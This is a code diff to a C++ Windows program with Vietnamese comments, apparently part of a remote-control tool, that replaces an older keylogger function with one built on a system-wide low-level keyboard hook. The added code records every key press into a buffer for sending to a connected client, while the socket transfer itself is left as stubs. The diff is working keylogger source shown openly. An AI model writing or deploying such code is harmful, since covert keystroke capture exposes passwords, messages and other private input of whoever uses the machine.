@@ -1,5 +1,5 @@
 ﻿#include "KeyloggerObject.h"
-
+/*
 std::string KLG_TransferObj::keylogger()
 {
 	std::string result = "";
@@ -14,6 +14,72 @@ std::string KLG_TransferObj::keylogger()
 	
 	return result;
 }
+*/
+
+
+
+LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode < 0) { // Bỏ qua các thông điệp khác nếu nCode < 0
+		return CallNextHookEx(NULL, nCode, wParam, lParam);
+	}
+	
+	// Lấy thông tin về sự kiện phím
+	KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+
+	if (wParam == WM_KEYDOWN)
+	{
+		// Nếu là sự kiện nhấn phím, lưu phím vào biến tạm
+		keylog.push_back(pkbhs->vkCode);
+	}
+
+	// Gọi hàm xử lý sự kiện tiếp theo trong chuỗi xử lý
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+std::string KLG_TransferObj::keylogger()
+{
+	// Thiết lập hook để bắt sự kiện phím
+	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+	// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
+	if (!hook)
+	{
+		std::cout << "Error setting keyboard hook: " << GetLastError() << std::endl;
+		
+		// Đóng socket và giải phóng thư viện Winsock
+		// ...
+
+		return "Hook failed.";
+	}
+
+	while (!checkStopSignal())
+	{
+		// Nếu đã bắt được ít nhất một phím, gửi danh sách các phím đã bắt được đến client
+		if (!keylog.empty())
+		{
+			// Ghép các phím đã bắt được thành một chuỗi
+			for (auto key : keylog)
+			{
+				_data.push_back(char(key));
+			}
+
+			// Xóa danh sách các phím đã bắt được
+			keylog.clear();
+		}
+
+		// Chờ 1 giây trước khi kiểm tra lại
+		Sleep(1000);
+	}
+
+	// Huỷ hook
+	UnhookWindowsHookEx(hook);
+	
+	// Đóng socket và giải phóng thư viện Winsock
+	// ...
+
+	return "Success";
+}
+
 
 bool KLG_TransferObj::checkStopSignal()
 {
@@ -27,6 +93,9 @@ bool KLG_TransferObj::checkStopSignal()
 	{
 		// gửi thông điệp đã nhận được tín hiệu cho client 
 		// ...
+		//closesocket(ClientSocket);
+		//closesocket(ListenSocket);
+		//WSACleanup();
 		return true;
 	}
 	return false;
